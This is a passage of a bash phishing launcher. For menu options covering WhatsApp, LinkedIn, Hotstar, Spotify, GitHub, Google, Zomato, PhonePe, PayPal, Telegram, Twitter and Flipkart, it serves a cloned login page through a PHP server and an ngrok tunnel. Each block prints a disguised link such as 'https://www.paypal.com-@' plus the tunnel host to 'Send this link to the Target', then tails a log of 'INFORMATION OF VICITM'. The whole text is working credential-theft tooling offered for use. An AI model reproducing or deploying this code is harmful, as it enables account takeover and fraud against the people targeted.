                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt                  
      
                break;
                elif [ $option = 11 ] || [ $option = 11 ]
	        then
                          cd Sites/
                          cd whatsapp-phishing/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.whatsapp.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt               
     

                break;
                elif [ $option = 12 ] || [ $option = 12 ]
	        then
                          cd Sites/
                          cd Linkedin/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://in.linkedin.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt  

                break;
                elif [ $option = 13 ] || [ $option = 13 ]
	        then
                          cd Sites/
                          cd Hotstar-otp-bypass/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.hotstar.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt                  
     

                break;
                elif [ $option = 14 ] || [ $option = 14 ]
	        then
                          cd Sites/
                          cd spotify/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.spotify.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt  

                break;
                elif [ $option = 15 ] || [ $option = 15 ]
	        then
                          cd Sites/
                          cd github/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://github.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt                  

                break;
                elif [ $option = 16 ] || [ $option = 16 ]
	        then
                          cd Sites/
                          cd ipfinder/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://google.com-login-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt                 

                break;
                elif [ $option = 17 ] || [ $option = 17 ]
	        then
               
                          cd Sites/
                          cd Zomato-Phishing/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.zomato.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt                  
             

                break;
                elif [ $option = 18 ] || [ $option = 18 ]
	        then

                          cd Sites/
                          cd phonepay/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WATN TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.phonepe.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt                  
                     

                break;
                elif [ $option = 19 ] || [ $option = 19 ]
	        then
                          cd Sites/
                          cd paypal/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.paypal.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt                  
     
                break;
                elif [ $option = 20 ] || [ $option = 20 ]
	        then
                          cd Sites/
                          cd telegram/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://web.telegram.org-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt  

                break;
                elif [ $option = 21 ] || [ $option = 21 ]
	        then
                          cd Sites/
                          cd twitter/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://twitter.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt  

                break;
                elif [ $option = 22 ] || [ $option = 22 ]
	        then
                          cd Sites/
                          cd flipcart/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
